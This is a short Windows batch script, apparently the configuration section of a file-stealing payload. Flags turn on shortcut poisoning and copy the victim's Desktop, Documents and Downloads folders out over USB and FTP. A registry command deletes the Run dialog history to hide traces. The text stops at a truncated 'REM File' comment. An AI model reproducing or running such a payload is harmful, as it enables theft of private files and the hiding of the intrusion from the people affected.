REM Configuration Section, configure options here with yes/no

REM Shortcut Section:
SET poison_shortcuts=yes
SET shortcut_privesc=no

REM Privilege Escalation Section:
SET priv_esc_HID=no

REM File Stealing Section:
SET steal_files_enabled=yes
SET steal_files_usb=yes
SET steal_files_ftp=yes
SET steal_desktop_folder=yes
SET steal_documents_folder=yes
SET steal_downloads_folder=yes




REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f


REM File
